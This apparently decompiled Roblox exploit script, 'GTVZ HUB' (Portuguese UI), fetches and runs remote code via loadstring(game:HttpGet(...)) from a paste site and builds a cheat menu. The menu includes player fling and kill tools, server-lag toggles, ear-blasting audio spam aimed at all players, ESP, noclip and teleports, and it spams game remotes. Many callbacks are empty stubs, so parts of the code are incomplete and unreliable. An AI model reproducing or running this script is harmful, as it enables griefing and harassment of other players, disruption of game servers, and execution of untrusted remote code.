obj:IsDescendantOf(plr.Character) then\n                        isPlayerPart = true\n                        break\n                    end\n                end\n                \n                if not isPlayerPart then\n                    limparObjeto(obj)\n                end\n            end\n            \n            -- Remove anima\231\245es dos jogadores (s\243 para, n\227o remove roupas)\n            for _, plr in pairs(Players:GetPlayers()) do\n                if plr.Character then\n                    local animator = plr.Character:FindFirstChildOfClass("Animator")\n                    if animator then\n                        for _, animTrack in pairs(animator:GetPlayingAnimationTracks()) do\n                            animTrack:Stop()\n                        end\n                    end\n                    -- N\195O remove acess\243rios, roupas, etc.\n                end\n            end\n            \n            -- Monitora novos objetos (pulando partes dos jogadores)\n            Workspace.DescendantAdded:Connect(function(obj)\n                task.wait()\n                \n                -- Verifica se o objeto pertence a algum jogador\n                local isPlayerObject = false\n                for _, plr in pairs(Players:GetPlayers()) do\n                    if plr.Character and obj:IsDescendantOf(plr.Character) then\n                        isPlayerObject = true\n                        break\n                    end\n                end\n                \n                if not isPlayerObject then\n                    limparObjeto(obj)\n                end\n            end)\n            \n            Lighting.DescendantAdded:Connect(function(obj)\n                if obj:IsA("PostEffect") or obj:IsA("BloomEffect") or obj:IsA("BlurEffect") or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("DepthOfFieldEffect") or obj:IsA("Atmosphere") then\n                    pcall(function()\n                        obj.Enabled = false\n                        task.wait(0.1)\n                        obj:Destroy()\n                    end)\n                end\n            end)\n            \n            -- Remove \225gua\n            for _, v in pairs(Workspace:GetChildren()) do\n                if v:IsA("Terrain") then\n                    v.WaterWaveSize = 0\n                    v.WaterWaveSpeed = 0\n                    v.WaterReflectance = 0\n                    v.WaterTransparency = 1\n                end\n            end\n        end\n    end,\n})')

local _call5 = Instance.new('Sky')

_call5.Name = 'Sky'
_call5.Parent = game.Lighting
_call5.SkyboxBk = 'http://www.roblox.com/asset/?id=103778952050387'
_call5.SkyboxDn = 'http://www.roblox.com/asset/?id=103778952050387'
_call5.SkyboxFt = 'http://www.roblox.com/asset/?id=103778952050387'
_call5.SkyboxLf = 'http://www.roblox.com/asset/?id=103778952050387'
_call5.SkyboxRt = 'http://www.roblox.com/asset/?id=103778952050387'
_call5.SkyboxUp = 'http://www.roblox.com/asset/?id=103778952050387'

local _call14 = game:GetService('ReplicatedStorage'):WaitForChild('RE'):FindFirstChild('1RPNam1eColo1r')

task.spawn(function()
    local _call19 = Color3.new(0, 0, 0)
    local _call21 = Color3.fromRGB(0, 255, 0)

    _call14:FireServer('PickingRPBioColor', Color3.new((_call19.R + ((_call21.R - _call19.R) * 0)), (_call19.G + ((_call21.G - _call19.G) * 0)), (_call19.B + ((_call21.B - _call19.B) * 0))))
    task.wait(0.03)
    _call14:FireServer('PickingRPBioColor', Color3.new((_call19.R + ((_call21.R - _call19.R) * 0.02)), (_call19.G + ((_call21.G - _call19.G) * 0.02)), (_call19.B + ((_call21.B - _call19.B) * 0.02))))
    task.wait(0.03)
    _call14:FireServer('PickingRPBioColor', Color3.new((_call19.R + ((_call21.R - _call19.R) * 0.04)), (_call19.G + ((_call21.G - _call19.G) * 0.04)), (_call19.B + ((_call21.B - _call19.B) * 0.04))))
    task.wait(0.03)
    _call14:FireServer('PickingRPBioColor', Color3.new((_call19.R + ((_call21.R - _call19.R) * 0.06)), (_call19.G + ((_call21.G - _call19.G) * 0.06)), (_call19.B + ((_call21.B - _call19.B) * 0.06))))
    task.wait(0.03)
    _call14:FireServer('PickingRPBioColor', Color3.new((_call19.R + ((_call21.R - _call19.R) * 0.08)), (_call19.G + ((_call21.G - _call19.G) * 0.08)), (_call19.B + ((_call21.B - _call19.B) * 0.08))))
    task.wait(0.03)
    _call14:FireServer('PickingRPBioColor', Color3.new((_call19.R + ((_call21.R - _call19.R) * 0.1)), (_call19.G + ((_call21.G - _call19.G) * 0.1)), (_call19.B + ((_call21.B - _call19.B) * 0.1))))
    task.wait(0.03)
    _call14:FireServer('PickingRPBioColor', Color3.new((_call19.R + ((_call21.R - _call19.R) * 0.12000000000000001)), (_call19.G + ((_call21.G - _call19.G) * 0.12000000000000001)), (_call19.B + ((_call21.B - _call19.B) * 0.12000000000000001))))
    task.wait(0.03)
    _call14:FireServer('PickingRPBioColor', Color3.new((_call19.R + ((_call21.R - _call19.R) * 0.14)), (_call19.G + ((_call21.G - _call19.G) * 0.14)), (_call19.B + ((_call21.B - _call19.B) * 0.14))))
    task.wait(0.03)
    _call14:FireServer('PickingRPBioColor', Color3.new((_call19.R + ((_call21.R - _call19.R) * 0.16)), (_call19.G + ((_call21.G - _call19.G) * 0.16)), (_call19.B + ((_call21.B - _call19.B) * 0.16))))
    task.wait(0.03)
    _call14:FireServer('PickingRPBioColor', Color3.new((_call19.R + ((_call21.R - _call19.R) * 0.18)), (_call19.G + ((_call21.G - _call19.G) * 0.18)), (_call19.B + ((_call21.B - _call19.B) * 0.18))))
    task.wait(0.03)
    _call14:FireServer('PickingRPBioColor', Color3.new((_call19.R + ((_call21.R - _call19.R) * 0.19999999999999998)), (_call19.G + ((_call21.G - _call19.G) * 0.19999999999999998)), (_call19.B + ((_call21.B - _call19.B) * 0.19999999999999998))))
    task.wait(0.03)
    _call14:FireServer('PickingRPBioColor', Color3.new((_call19.R + ((_call21.R - _call19.R) * 0.21999999999999997)), (_call19.G + ((_call21.G - _call19.G) * 0.21999999999999997)), (_call19.B + ((_call21.B - _call19.B) * 0.21999999999999997))))
    task.wait(0.03)
    _call14:FireServer('PickingRPBioColor', Color3.new((_call19.R + ((_call21.R - _call19.R) * 0.23999999999999996)), (_call19.G + ((_call21.G - _call19.G) * 0.23999999999999996)), (_call19.B + ((_call21.B - _call19.B) * 0.23999999999999996))))
    task.wait(0.03)
    _call14:FireServer('PickingRPBioColor', Color3.new((_call19.R + ((_call21.R - _call19.R) * 0.25999999999999995)), (_call19.G + ((_call21.G - _call19.G) * 0.25999999999999995)), (_call19.B + ((_call21.B - _call19.B) * 0.25999999999999995))))
    task.wait(0.03)
    _call14:FireServer('PickingRPBioColor', Color3.new((_call19.R + ((_call21.R - _call19.R) * 0.27999999999999997)), (_call19.G + ((_call21.G - _call19.G) * 0.27999999999999997)), (_call19.B + ((_call21.B - _call19.B) * 0.27999999999999997))))
    task.wait(0.03)
    _call14:FireServer('PickingRPBioColor', Color3.new((_call19.R + ((_call21.R - _call19.R) * 0.3)), (_call19.G + ((_call21.G - _call19.G) * 0.3)), (_call19.B + ((_call21.B - _call19.B) * 0.3))))
    task.wait(0.03)

    local _ = Color3.new
    local _ = _call19.R + ((_call21.R - _call19.R) * 0.32)
    local _ = _call19.G + ((_call21.G - _call19.G) * 0.32)

    error('internal 582: <25ms: infinitelooperror>')
end)
game:GetService('Players').LocalPlayer.CharacterAdded:Connect(function()
    task.wait(1)
    task.spawn(function()
        error('internal 582: <25ms: infinitelooperror>')
    end)
end)
wait(0.4)
game:GetService('ReplicatedStorage').RE:FindFirstChild('1RPNam1eTex1t'):FireServer('RolePlayBio', 'CARREGANDO SCRIPT')
wait(5)
game:GetService('ReplicatedStorage').RE:FindFirstChild('1RPNam1eTex1t'):FireServer('RolePlayBio', 'USE : GTVZ HUB')
wait(2)

local _414 = loadstring(game:HttpGet('https://pastefy.app/SibplqH8/raw'))()

workspace.FallenPartsDestroyHeight = -1 / 0

local _call416 = _414:MakeWindow({
    LoadText = 'GTVZ HUB',
    SubTitle = 'YT : GT_MINGUI',
    Title = 'GTVZ HUB',
    Flags = 'GTVZ HUB',
})

_call416:AddMinimizeButton({
    Button = {
        BackgroundTransparency = 0,
        Image = 'rbxassetid://17628296195',
    },
    Corner = {
        CornerRadius = UDim.new(35, 1),
    },
})

local _call422 = _call416:MakeTab({
    Title = 'STATUS',
    Icon = 'rbxassetid://10723415903',
})
local _call424 = _call416:MakeTab({
    Title = 'INFO',
    Icon = 'rbxassetid://10709790387',
})
local _call426 = _call416:MakeTab({
    [1] = 'JOGADOR',
    [2] = 'user',
})
local _call428 = _call416:MakeTab({
    [1] = 'AVATA',
    [2] = 'rbxassetid://10734952036',
})
local _call430 = _call416:MakeTab({
    Title = 'TROLL',
    Icon = 'rbxassetid://131153193945220',
})
local _call432 = _call416:MakeTab({
    Title = 'ANTI',
    Icon = 'rbxassetid://11322093465',
})
local _call434 = _call416:MakeTab({
    [1] = 'CASA',
    [2] = 'home',
})
local _call436 = _call416:MakeTab({
    [1] = 'TELEPORT',
    [2] = 'tp',
})
local _call438 = _call416:MakeTab({
    [1] = 'TROLL AUDIO',
    [2] = 'music',
})
local _call440 = _call416:MakeTab({
    [1] = 'VE\205CULO',
    [2] = 'car',
})
local _call442 = _call416:MakeTab({
    Title = 'CONFIG',
    Icon = 'settings',
})

_call422:AddSection({
    Name = 'STATUS',
})
_call422:AddParagraph({
    [1] = 'TEMPO JOGANDO',
    [2] = '0s',
})
task.spawn(function() end)

local _call451 = game:GetService('MarketplaceService')

_call422:AddParagraph({
    [1] = 'JOGO',
    [2] = _call451:GetProductInfo(game.PlaceId).Name,
})
_call422:AddParagraph({
    [1] = 'M\193XIMO NO SERVIDOR',
    [2] = tostring(game.Players.MaxPlayers),
})

local _ = #game.Players:GetPlayers()

_call422:AddParagraph({
    [1] = 'JOGADORES',
    [2] = '963388671',
})
task.spawn(function() end)

local _call475 = game:GetService('UserInputService'):GetPlatform()
local _ = _call475 == Enum.Platform.Windows
local _ = _call475 == Enum.Platform.OSX
local _ = _call475 == Enum.Platform.XBoxOne
local _ = _call475 == Enum.Platform.IOS
local _ = _call475 == Enum.Platform.Android

_call422:AddParagraph({
    [1] = 'DISPOSITIVO',
    [2] = 'DISPOSITIVO : DESCONHECIDO',
})

local _493 = identifyexecutor()

warn('Executor detectado: ' .. _493)
_call422:AddParagraph({
    [1] = 'EXECUTOR',
    [2] = _493,
})
_call422:AddSection({
    Name = 'CONFIG',
})
_call422:AddButton({
    Name = 'RECONECTAR',
    Callback = function() end,
})
_call422:AddButton({
    Name = 'IR PRA SERVER CHEIO',
    Callback = function() end,
})
_call422:AddButton({
    Name = 'MUDA DE SERVER',
    Callback = function() end,
})
_call424:AddDiscordInvite({
    Invite = 'https://discord.gg/SXtfYJSPny',
    Description = 'DISCORD GTVZ HUB',
    Name = 'GTVZ HUB',
    Logo = 'rbxassetid://17628296195',
})
_call424:AddParagraph({
    [1] = 'DESENVOLVENDO : GTVZ MODDED',
})
_call424:AddParagraph({
    [1] = 'EQUIPE : GTXMIX',
})
_call426:AddSection({
    Name = 'JOGADOR',
})
_call426:AddButton({
    Name = 'FLY JOGADO',
    Callback = function() end,
})
game:GetService('RunService')

local _LocalPlayer523 = game.Players.LocalPlayer

_LocalPlayer523.CharacterAdded:Connect(function(_527) end)

local _ = _LocalPlayer523.Character
local _call531 = _LocalPlayer523.Character:WaitForChild('Humanoid', 5)

_call531.WalkSpeed = 16
_call531.UseJumpPower = true
_call531.JumpPower = 50

_call426:AddToggle({
    Name = 'ATRAVESSAR PAREDE',
    Callback = function(_534) end,
})
_call426:AddTextBox({
    PlaceholderText = 'DIGITE A VELOCIDADE',
    Name = 'VELOCIDADE JOGADOR',
    Callback = function(_537) end,
})
_call426:AddButton({
    Name = 'RESETAR VELOCIDADE',
    Callback = function() end,
})
_call426:AddTextBox({
    PlaceholderText = 'DIGITE ALTURA PULO',
    Name = 'ALTURA DO PULO',
    Callback = function(_543) end,
})
_call426:AddButton({
    Name = 'RESETAR PULO',
    Callback = function() end,
})
_call426:AddTextBox({
    PlaceholderText = 'DIGITE GRAVIDADE',
    Name = 'GRAVIDADE',
    Callback = function(_549) end,
})
_call426:AddButton({
    Name = 'RESETAR GRAVIDADE',
    Callback = function() end,
})
_call426:AddSection({
    Name = 'ESP JOGADOR',
})
game:GetService('RunService')

local _ = game:GetService('Players').LocalPlayer

_call426:AddToggle({
    Callback = function(_562) end,
    Name = 'ESP NOME DISTANCIA',
    Default = false,
})
Color3.fromRGB(0, 255, 0)
Color3.fromRGB(0, 0, 0)
game:FindService('CoreGui')

local _ = game:FindService('Players').LocalPlayer

_call426:AddToggle({
    Callback = function(_574) end,
    Name = 'ESP HOLOGRAMA',
    Default = false,
})
_call428:AddSection({
    Name = 'PRINCIPAL',
})
_call428:AddToggle({
    Callback = function(_579) end,
    Name = 'NOME RGB',
    Default = false,
})
game:GetService('Players')
game:GetService('ReplicatedStorage'):WaitForChild('RE'):FindFirstChild('1RPNam1eColo1r')
Color3.fromRGB(255, 0, 0)
Color3.fromRGB(255, 102, 0)
Color3.fromRGB(255, 255, 0)
Color3.fromRGB(0, 255, 0)
Color3.fromRGB(0, 255, 255)
Color3.fromRGB(0, 102, 255)
Color3.fromRGB(153, 0, 255)
Color3.fromRGB(255, 0, 255)
Color3.fromRGB(255, 105, 180)
Color3.fromRGB(255, 215, 0)
Color3.fromRGB(0, 255, 127)
Color3.fromRGB(135, 206, 250)
Color3.fromRGB(255, 51, 153)
Color3.fromRGB(102, 255, 178)
Color3.fromRGB(204, 153, 255)
_call428:AddToggle({
    Callback = function(_620) end,
    Name = 'CORPO RGB',
    Default = false,
})
Color3.new(1, 1, 0)
Color3.new(0, 0, 1)
Color3.new(1, 0, 1)
Color3.new(1, 1, 1)
Color3.new(0, 1, 0)
Color3.new(0.5, 0, 1)
Color3.new(1, 0.647, 0)
Color3.new(0, 1, 1)
_call428:AddToggle({
    Callback = function(_639) end,
    Name = 'CABELO RGB',
    Default = false,
})

local _call641 = game:GetService('Players')

game:GetService('ReplicatedStorage'):WaitForChild('Remotes')

for _648, _648_2 in ipairs(_call641:GetPlayers()) do end

_call428:AddDropdown({
    Callback = function(_652) end,
    Name = 'SELECIONAR JOGADOR',
    Options = {
        [1] = _648_2.Name,
    },
})
_call641.PlayerAdded:Connect(function() end)
_call641.PlayerRemoving:Connect(function() end)
_call428:AddButton({
    Name = 'COPIAR AVATAR',
    Callback = function() end,
})

local _call665 = game:GetService('Players')
local _LocalPlayer666 = _call665.LocalPlayer

game:GetService('ReplicatedStorage')
game:GetService('VirtualInputManager')
game:GetService('RunService')

local _ = workspace.CurrentCamera

genv.Target = nil

local _Character674 = _LocalPlayer666.Character

_Character674:WaitForChild('HumanoidRootPart')
_LocalPlayer666.CharacterAdded:Connect(function(_682) end)
_Character674:WaitForChild('Humanoid').Died:Connect(function() end)
_call430:AddSection({
    Name = 'Troll Player',
})

for _691, _691_2 in ipairs(_call665:GetPlayers())do
    local _ = _691_2 == _LocalPlayer666
end

_call430:AddDropdown({
    Callback = function(_696) end,
    Default = '',
    Name = 'SELECIONAR JOGADOR',
    Options = {
        [1] = _691_2.Name,
    },
})
_call430:AddButton({
    Name = 'ATUALIZAR LISTA',
    Callback = function() end,
})
_call430:AddButton({
    Name = 'TP JOGADOR',
    Callback = function() end,
})
_call430:AddToggle({
    Callback = function(_705) end,
    Name = 'OLHA JOGADOR',
    Default = false,
})
_call430:AddSection({
    Name = 'M\201TODOS',
})
_call430:AddDropdown({
    Callback = function(_710) end,
    Default = '',
    Name = 'SELECIONAR METADO',
    Options = {
        [1] = '\212NIBUS',
        [2] = 'SOFA',
        [3] = 'SOFA V2',
    },
})
_call430:AddButton({
    Name = 'ELIMINAR JOGADOR',
    Callback = function() end,
})
_call430:AddButton({
    Name = 'PUXAR JOGADOR',
    Callback = function() end,
})
_call430:AddButton({
    Name = 'MATA JOGADOR BAN',
    Callback = function() end,
})

local _ = game:GetService('Players').LocalPlayer
local _ = game:GetService('Players').LocalPlayer
local _ = game:GetService('Players').LocalPlayer

_call430:AddToggle({
    Callback = function(_731) end,
    Name = 'FLING FATAL=\128',
    Default = false,
})
_call430:AddButton({
    Name = 'FLING BOLA',
    Callback = function() end,
})

local _ = game:GetService('Players').LocalPlayer

_call430:AddSection({
    Name = 'FLING BARCO',
})
_call430:AddButton({
    Name = 'FLING BARCO',
    Callback = function() end,
})
print('Fling - Boat button created')
_call430:AddButton({
    Name = 'DESATIVAR FLING BARCO',
    Callback = function() end,
})
_call430:AddSection({
    Name = 'FLING CLICKS',
})
_call430:AddButton({
    Callback = function() end,
    Name = 'FLING PORTA CLICK',
    Description = 'FIQUE PERTO DAS PORTAS',
})
_call430:AddButton({
    Name = 'FLING SOFA CLICK ',
    Callback = function() end,
})
_call430:AddButton({
    Name = 'FLING BOLA CLICK',
    Callback = function() end,
})
_call430:AddButton({
    Name = 'FLING ELIMINAR SOFA CLICK',
    Callback = function() end,
})
_call430:AddSection({
    Name = 'FLING TODOS',
})
_call430:AddButton({
    Name = 'ELIMINAR TODOS \212NIBUS',
    Callback = function() end,
})
print('Kill All Bus button created')
_call430:AddButton({
    Name = 'MATA JOGADOR BAN',
    Callback = function() end,
})
print('House Ban kill All button created')
_call430:AddButton({
    Name = 'FLING TODOS BARCO ',
    Callback = function() end,
})
print('Fling Boat All button created')
_call430:AddButton({
    Name = 'FLING TODOS ARMS',
    Callback = function() end,
})
_call430:AddButton({
    Name = 'FLING TODOS BOLA',
    Callback = function() end,
})
_call430:AddSection({
    Name = 'MENU PRA\199A',
})

local _ = game:GetService('Players').LocalPlayer
local _call791 = Instance.new('Folder', game:GetService('Workspace'))

_call791.Name = 'BringPartsFolder'

local _call793 = Instance.new('Part', _call791)

_call793.Anchored = true
_call793.CanCollide = false
_call793.Transparency = 1
_call793.Size = Vector3.new(5, 5, 5)
_call793.Position = Vector3.new(-26.54624575495172, 4.13895320892334, 3.941930037536621)

Instance.new('Attachment', _call793)

local _ = genv.Network

genv.Network = {
    BaseParts = {},
    Velocity = Vector3.new(100000000, 100000000, 100000000),
}

local _ = genv.Network

game:GetService('RunService').Heartbeat:Connect(function() end)
_call430:AddButton({
    Callback = function() end,
    Name = 'AUTO SPAW ELI',
    Description = 'SPAWNA HELI SALVA VIDAS NA PRA\199A',
})
_call430:AddButton({
    Name = 'DESATIVAR',
    Callback = function() end,
})
_call430:AddSection({
    Name = 'MENU JOGADOR',
})

local _ = game:GetService('Players').LocalPlayer

game:GetService('RunService')

local _call824 = Instance.new('Folder', game:GetService('Workspace'))

_call824.Name = 'BringPartsFolder'

local _call826 = Instance.new('Part', _call824)

_call826.Anchored = true
_call826.CanCollide = false
_call826.Transparency = 1
_call826.Size = Vector3.new(5, 5, 5)

Instance.new('Attachment', _call826)

local _ = genv.Network

_call430:AddButton({
    Callback = function() end,
    Name = 'AUTO SPAW ELI JOGADOR',
    Description = 'SPAWNA ELI NOS JOGADORES ESPALHANDO ELI PELO MAPA',
})
_call430:AddButton({
    Name = 'DESATIVAR',
    Callback = function() end,
})
_call430:AddSection({
    Name = 'LAGA SERVER',
})
_call430:AddToggle({
    Callback = function(_842) end,
    Name = 'LAG COMPUTADOR',
    Default = false,
})
_call430:AddToggle({
    Callback = function(_845) end,
    Name = 'LAG CELULA',
    Default = false,
})
_call430:AddToggle({
    Callback = function(_848) end,
    Name = 'LAG BOMBA',
    Default = false,
})
_call430:AddSection({
    Name = 'MENU CEU',
})
_call430:AddButton({
    Name = 'IMAGEM NO CEU',
    Callback = function() end,
})
_call430:AddButton({
    Name = 'DESATIVAR IMAGEM',
    Callback = function() end,
})
_call430:AddToggle({
    Callback = function(_859) end,
    Name = 'IMAGEM NO CEU 1.0',
    Default = false,
})
_call430:AddToggle({
    Callback = function(_862) end,
    Name = 'IMAGEM NO CEU 2.0',
    Default = false,
})

local _ = game:GetService('Players').LocalPlayer

game:GetService('Workspace')
game:GetService('RunService')
_call432:AddSection({
    Name = 'MENU ANTI',
})
_call432:AddButton({
    Callback = function() end,
    Name = 'PROTE\199\195O BUG {IRREVERS\205VEL}',
    Description = 'CRIA UMA PROTE\199\195O CONTRA BUGS/SCRIPT',
})
_call432:AddButton({
    Name = 'ANTI ST FULL',
    Callback = function() end,
})

local _ = game:GetService('Players').LocalPlayer

_call432:AddToggle({
    Callback = function(_883) end,
    Name = 'ANTI TOOL FULL',
    Default = false,
})
task.spawn(function() end)
_call432:AddToggle({
    Callback = function(_889) end,
    Default = false,
    Name = 'ANTI FLING CARROS',
    Description = '',
})
task.spawn(function() end)
_call432:AddToggle({
    Callback = function(_895) end,
    Default = false,
    Name = 'ANTI CANOE FLING',
    Description = '',
})
task.spawn(function() end)
_call432:AddToggle({
    Callback = function(_901) end,
    Default = false,
    Name = 'ANTI FLING JETS',
    Description = '',
})
task.spawn(function() end)
_call432:AddToggle({
    Callback = function(_907) end,
    Default = false,
    Name = 'ANTI FLING HELIC\211PTEROS',
    Description = '',
})
task.spawn(function() end)
_call432:AddToggle({
    Callback = function(_913) end,
    Default = false,
    Name = 'ANTI FLING BOLA',
    Description = '',
})
_call432:AddToggle({
    Callback = function(_916) end,
    Default = false,
    Name = 'ANTI SENTA',
    Description = '',
})
_call432:AddToggle({
    Callback = function(_919) end,
    Default = false,
    Name = 'ANTI-LAG',
    Description = '',
})
_call432:AddToggle({
    Callback = function(_922) end,
    Default = false,
    Name = 'ANTI FLING PORTAS',
    Description = '',
})
Color3.new(1, 0, 0)
Color3.new(0, 1, 0)
Color3.new(0, 0, 1)
Color3.new(1, 1, 0)
Color3.new(0, 1, 1)
Color3.new(1, 0, 1)
_call434:AddToggle({
    Callback = function(_937) end,
    Name = 'CASA RGB',
    Default = false,
})
_call434:AddButton({
    Name = 'UNBAN',
    Callback = function() end,
})
_call434:AddSection({
    Name = 'TROLL CASA',
})

for _947, _947_2 in ipairs(workspace:FindFirstChild('001_Lots'):GetChildren())do
    local _ = _947_2.Name

    _947_2:IsA('Model')
    _call434:AddButton({
        Name = 'ATUALIZAR LISTA DE CASAS',
        Callback = function() end,
    })
    _call434:AddButton({
        Name = 'TELEPORTAR PARA CASA',
        Callback = function() end,
    })
    _call434:AddButton({
        Name = 'Teleportar para Cofre',
        Callback = function() end,
    })
    _call434:AddToggle({
        Callback = function(_964) end,
        Default = false,
        Name = 'ATRAVESSAR PORTA DAS CASA',
        Description = '',
    })
    _call434:AddToggle({
        Callback = function(_967) end,
        Default = false,
        Name = 'TOCAR CAMPAINHA',
        Description = '',
    })
    _call434:AddToggle({
        Callback = function(_970) end,
        Default = false,
        Name = 'BATER NA PORTA',
        Description = '',
    })
    _call434:AddSection({
        Name = 'TELEPORTE PARA CASAS',
    })
    Vector3.new(260.29, 4.37, 209.32)
    Vector3.new(234.49, 4.37, 228)
    Vector3.new(262.79, 21.37, 210.84)
    Vector3.new(229.6, 21.37, 225.4)
    Vector3.new(173.44, 21.37, 228.11)
    Vector3.new(-43, 21, -137)
    Vector3.new(-40, 36, -137)
    Vector3.new(-21, 40, 436)
    Vector3.new(155, 37, 433)
    Vector3.new(255, 35, 431)
    Vector3.new(254, 38, 394)
    Vector3.new(148, 39, 387)
    Vector3.new(-17, 42, 395)
    Vector3.new(-189, 37, -247)
    Vector3.new(-354, 37, -244)
    Vector3.new(-456, 36, -245)
    Vector3.new(-453, 38, -295)
    Vector3.new(-356, 38, -294)
    Vector3.new(-187, 37, -295)
    Vector3.new(-410, 68, -447)
    Vector3.new(-348, 69, -496)
    Vector3.new(-103, 12, 1087)
    Vector3.new(-730, 6, 808)
    Vector3.new(-245, 7, 822)
    Vector3.new(639, 76, -361)
    Vector3.new(-908, 6, -361)
    Vector3.new(-111, 70, -417)
    Vector3.new(230, 38, 569)
    Vector3.new(-30, 13, 2209)
    _call434:AddDropdown({
        Callback = function(_1033) end,
        Name = 'Selecionar Casa',
        Options = {
            [1] = 'Casa 1',
            [2] = 'Casa 2',
            [3] = 'Casa 3',
            [4] = 'Casa 4',
            [5] = 'Casa 5',
            [6] = 'Casa 6',
            [7] = 'Casa 7',
            [8] = 'Casa 11',
            [9] = 'Casa 12',
            [10] = 'Casa 13',
            [11] = 'Casa 14',
            [12] = 'Casa 15',
            [13] = 'Casa 16',
            [14] = 'Casa 17',
            [15] = 'Casa 18',
            [16] = 'Casa 19',
            [17] = 'Casa 20',
            [18] = 'Casa 21',
            [19] = 'Casa 22',
            [20] = 'Casa 23',
            [21] = 'Casa 24',
            [22] = 'Casa 28',
            [23] = 'Casa 29',
            [24] = 'Casa 30',
            [25] = 'Casa 31',
            [26] = 'Casa 32',
            [27] = 'Casa 33',
            [28] = 'Casa 34',
            [29] = 'Casa 35',
        },
    })
    CFrame.new(192, 4, 272)
    CFrame.new(136, 4, 117)
    CFrame.new(-119, -28, 235)
    CFrame.new(986, 4, 63)
    CFrame.new(672, 4, -296)
    CFrame.new(505, -75, 143)
    CFrame.new(-312, 4, 211)
    CFrame.new(161, 8, 52)
    CFrame.new(-26, 4, -23)
    CFrame.new(-589, 141, -59)
    CFrame.new(-309, 4, 71)
    CFrame.new(179, 4, -464)
    CFrame.new(0, 4, -495)
    CFrame.new(-343, 4, -613)
    CFrame.new(-1925, 23, 127)
    CFrame.new(182, 4, 150)
    CFrame.new(-670, 251, 765)
    CFrame.new(2.28, 4.65, 254.58)
    CFrame.new(-46.15, 4.65, 253.2)
    CFrame.new(-88.48, 22.05, 262.34)
    CFrame.new(-53.58, 22.15, 265.61)
    CFrame.new(-97.12, 4.65, 254.99)
    _call436:AddButton({
        [1] = 'TP BASTIDORES',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP CENTRO URBANO',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP \193REA DO CRIME',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP CASA DESERTA',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP PORTAL DA AG\202NCIA',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP ESCONDERIJO',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP ESCOLA',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP CAF\201 BROOK',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TO PONTO INICIAL',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP ARCO PRINCIPAL',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP HOSPITAL',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP BASE DA AG\202NCIA',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP SALA OCULTA DA OFICINA',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP SALA SECRETA 2',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP ILHA ISOLADA',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP PRA\199A DOS HOT\201IS',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP ESCALAR MONTANHA 1',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP BANCO PRINCIPAL',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP LOJA DE ROUPAS',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP REF\218GIO',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP CL\205NICA DENT\193RIA',
        [2] = function() end,
    })
    _call436:AddButton({
        [1] = 'TP CAFETERIA',
        [2] = function() end,
    })
    _call438:AddTextBox({
        Callback = function(_1146) end,
        PlaceholderText = 'ID do \225udio',
        Name = 'Insira o ID do \193udio ou Musica',
        Description = 'Digite o ID do \225udio',
    })
    _call438:AddDropdown({
        Name = 'SELECIONE \193UDIO',
        Options = {
            [1] = 'Yamete Kudasai',
            [2] = 'Gritinho',
            [3] = 'Jumpscare Horroroso',
            [4] = '\193udio Alto',
            [5] = 'Ru\237do',
            [6] = 'Jumpscare 2',
            [7] = 'Risada Da Bruxa Minecraft',
            [8] = 'The Boiled One',
            [9] = 'Deitei Um Ave Maria Doido',
            [10] = 'Mandrake Detected',
            [11] = 'Aaaaaaaaa',
            [12] = 'AAAHHHH',
            [13] = 'amongus',
            [14] = 'Sus',
            [15] = 'Gritao AAAAAAAAA',
            [16] = 'UHHHHH COFFCOFF',
            [17] = 'SUS',
            [18] = 'Sonic.exe',
            [19] = 'Tubers93 1',
            [20] = 'Tubers93 2',
            [21] = "John's Laugh",
            [22] = 'Nao sei KKKK',
            [23] = 'Grito',
            [24] = 'audio estranho',
            [25] = 'AAAH',
            [26] = 'Gay, gay',
            [27] = 'Bat Hit',
            [28] = 'Nuclear Siren',
            [29] = 'Sem ideia de nome KK',
            [30] = 'Grito 2',
            [31] = 'Estora t\237mpano',
            [32] = '[ Content Deleted ]',
            [33] = 'Toma Jack',
            [34] = 'Pede ifood pede',
            [35] = 'I Ghost The down',
            [36] = 'Compre OnLine Na shoope',
            [37] = 'Uh Que Nojo',
            [38] = 'Sai dai Lava Prato',
            [39] = 'Seloko num compensa',
            [40] = '(EM BREVE)  FUNK',
            [41] = 'Candyland - Tobu',
            [42] = 'Meme do Dom pollo What the hell',
            [43] = 'n\227o to entendendo nd meme estourado',
        },
        Flag = 'selected_audio',
        Default = 'Yamete Kudasai',
        Callback = function(_1149) end,
        Description = 'Escolha um \225udio da lista',
    })
    _call438:AddSection({
        [1] = 'LOOP DE AUDIO',
    })
    _call438:AddToggle({
        Flag = 'audio_loop',
        Callback = function(_1154) end,
        Name = 'REPETIR  \193UDIO',
        Default = false,
    })
    _call438:AddButton({
        [1] = 'TOCA \193UDIO',
        [2] = function() end,
    })
    game:GetService('ReplicatedStorage')
    _call438:AddToggle({
        Name = ' \193UDIO ESTOURADO EM TODOS',
        Flag = 'audio_spam',
        Default = false,
        Callback = function(_1162) end,
        Description = 'Toca \225udio repetidamente para todos',
    })
    _call440:AddButton({
        Name = 'FLY CAR',
        Callback = function() end,
    })
    _call440:AddToggle({
        Callback = function(_1168) end,
        Name = 'AUTO REMOVER VE\205CULO',
        Description = 'REMOVE TODOS VE\205CULO',
    })
    _call440:AddButton({
        Name = 'REMOVE TODOS CARROS',
        Callback = function() end,
    })
    _call440:AddToggle({
        Callback = function(_1174) end,
        Name = 'CARRO RGB',
        Default = false,
    })
